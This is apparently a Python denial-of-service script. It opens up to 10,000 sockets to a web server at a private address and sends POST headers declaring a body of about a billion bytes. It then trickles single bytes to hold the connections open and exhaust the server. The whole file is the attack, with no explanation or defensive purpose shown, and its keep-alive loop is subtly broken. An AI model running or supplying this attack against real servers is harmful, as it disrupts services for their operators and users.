import socket
import sys
import time
import threading

MAX_CONN = 200
PORT = 80
HOST = "192.168.3.218"
PAGE = "/"
buf = "".encode()
# buf = ("POST %s HTTP/1.1\r\n"
#        "Host: %s\r\n"
#        "Content-Length: 10000000000\r\n"
#        "Cookie: dklkt_dos_test\r\n"
#        "\r\n" % (PAGE, HOST))
# buf = buf.encode()
socks = []


def conn_thread():
    global socks
    for i in range(0, MAX_CONN):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((HOST, PORT))
            s.send(buf)
            # print("[+] Send buf OK!,conn=%d\n" % i)
            socks.append(s)
        except Exception as ex:
            print("[-] Could not connect to server or send error:%s" % ex)
            time.sleep(0)


def send_thread():
    global socks
    while True:
        for s in socks:
            try:
                s.send("f")
                # print("[+] send OK! %s" % s)
            except Exception as ex:
                print("[-] send Exception:%s\n" % ex)
                socks.remove(s)
                s.close()
        time.sleep(0)
        sys.exit(0)


def run(host, times=5000, page="/", port=80):
    global buf, MAX_CONN, PORT, HOST, PAGE
    MAX_CONN = times
    PORT = port
    HOST = host
    PAGE = page
    buf = ("POST %s HTTP/1.1\r\n"
           "Host: %s\r\n"
           "Content-Length: 1000000000\r\n"
           "Cookie: dklkt_dos_test\r\n"
           "\r\n" % (PAGE, HOST))
    buf = buf.encode()
    conn_th = threading.Thread(target=conn_thread, args=())
    send_th = threading.Thread(target=send_thread, args=())
    conn_th.start()
    send_th.start()

if __name__ == "__main__":
    run(HOST, 10000)